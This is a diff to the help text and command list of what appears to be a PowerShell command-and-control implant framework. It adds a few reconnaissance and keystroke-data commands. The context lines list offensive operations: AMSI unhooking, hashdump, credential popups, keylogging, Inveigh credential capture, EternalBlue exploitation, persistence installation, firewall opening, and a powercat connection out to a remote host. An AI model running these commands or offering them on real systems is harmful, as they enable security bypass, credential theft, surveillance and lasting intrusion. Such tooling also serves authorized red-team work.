@@ -77,8 +77,8 @@ get-wmiregmounteddrive
 resolve-ipaddress
 unhook-amsi
 get-process -id $pid -module |%{ if ($_.modulename -eq "amsi.dll") {echo "`nAMSI Loaded`n"} }
+get-wmiObject -class win32_product
 """
-
 
 posh_help2 = """
 Privilege Escalation:
@@ -172,7 +172,7 @@ brute-locadmin -username administrator
 get-passpol
 get-passnotexp
 get-locadm
-invoke-inveigh -http y -proxy y -nbns y -tool 1
+invoke-inveigh -http y -proxy y -nbns y -tool 1 -StartupChecks y
 get-inveigh | stop-inveigh (gets output from inveigh thread)
 invoke-sniffer -outputfile c:\\temp\\output.txt -maxsize 50mb -localip 10.10.10.10
 invoke-sqlquery -sqlserver 10.0.0.1 -user sa -pass sa -query 'select @@version'
@@ -230,6 +230,7 @@ cred-popper
 get-clipboard
 hashdump
 get-keystrokes
+get-keystrokedata
 arpscan -ipcidr 10.0.0.1/24
 portscan -ipaddress 10.0.0.1-50 -ports "1-65535" -maxqueriesps 10000 -delay 0
 ((new-object Net.Sockets.TcpClient).connect("10.0.0.1",445))
@@ -246,6 +247,7 @@ netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow prog
 $socket = new-object System.Net.Sockets.TcpListener('0.0.0.0', 1080);$socket.start();
 reversedns 10.0.0.1
 powercat -c 172.0.0.1 -p 8080 -d
+[System.Net.Dns]::GetHostbyAddress("10.0.0.1")
 
 Implant Handler:
 =====================
@@ -326,7 +328,7 @@ COMMANDS = ['loadmodule',"bloodhound","brute-ad","brute-locadmin",
 "install-servicelevel-persistence","remove-servicelevel-persistence","reversedns",
 "invoke-eternalblue","loadmoduleforce","unhook-amsi","get-implantworkingdirectory","get-system",
 "get-system-withproxy","get-system-withdaisy","get-pid","listmodules","modulesloaded",
-"startanotherimplant","remove-persistence","removeexe-persistence","installexe-persistence"]
+"startanotherimplant","remove-persistence","removeexe-persistence","installexe-persistence","resolve-ipaddress"]
 
 COMMANDS += ['invoke-psexecpayload','invoke-wmipayload', 'invoke-dcompayload']
 COMMANDS += ['invoke-psexecproxypayload','invoke-wmiproxypayload', 'invoke-dcomproxypayload']
